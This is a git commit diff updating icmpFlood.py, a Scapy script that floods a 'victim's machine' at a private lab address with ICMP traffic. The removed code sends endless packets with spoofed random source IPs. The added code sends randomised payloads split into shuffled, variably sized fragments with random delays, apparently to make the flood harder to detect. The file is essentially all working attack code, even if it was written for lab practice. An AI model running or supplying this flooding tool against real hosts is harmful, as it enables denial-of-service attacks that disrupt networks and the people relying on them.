a1a49e5d93c5b7bcc4a2ed6bb6e42bfde4eef742
FraVinci <34674317+FraVinci@users.noreply.github.com>
2024-11-13 14:27:40 +0100

    Update icmpFlood.py

--- icmpFlood.py
+++ icmpFlood.py
@@ -1,19 +1,33 @@
-from scapy.all import *
+from scapy.all import IP, ICMP, send, fragment
 from datetime import datetime
 import random
+import time
 
-#IP address of the victim's machine
-target_ip = "192.168.56.102"
+def icmpFlood(targetIp, packetCount):
+    try:
+        for i in range(packetCount):
+            payload = bytes([random.randint(0, 255) for _ in range(random.randint(800, 1400))])
+            
+            #Pacchetto IP, ICMP with random ID, type and seq
+            packet = IP(dst=targetIp, id=random.randint(1, 65535), flags="MF") / ICMP(type=random.choice([8, 0]), seq=random.randint(1, 65535)) / payload
+            
+            #Frammenta il pacchetto in pezzi più piccoli
+            fragmentedPackets = fragment(packet, fragsize=random.randint(64, 128))  #Fragment with variable size
+            
+            #Send fragments in random order with random delays
+            random.shuffle(fragmentedPackets)
+            for frag in fragmentedPackets:
+                send(frag, verbose=0)
+                time.sleep(random.uniform(0.02, 0.1))  #Random delays
+            
+            currentTime = datetime.now().strftime("%d-%m-%Y %H:%M:%S.%f")
+            print(f"{i+1} - Packet sent - {currentTime}")
+        
+    except KeyboardInterrupt:
+        print("\nICMP flooding stob by user")
+    except Exception as e:
+        print(f"Error: {e}")
 
-def icmp_flood(target_ip):
-	i = 0
-	while True:
-		i = i+1
-		ip_layer = IP(src=".".join(map(str, (random.randint(1, 254) for _ in range(4)))), dst=target_ip)
-		icmp_layer = ICMP()
-		packet = ip_layer/icmp_layer
-		send(packet, verbose=0)
-		current_time = datetime.now().strftime("%d-%m-%Y %H:%M:%S%f")
-		print(f"{i} - Packet sent - {current_time}")
-
-icmp_flood(target_ip)
+targetIp = "192.168.56.102"  #IP address of the victim's machine Inserisci l'IP della macchina bersaglio
+packetCount = 100  
+icmpFlood(targetIp, packetCount)
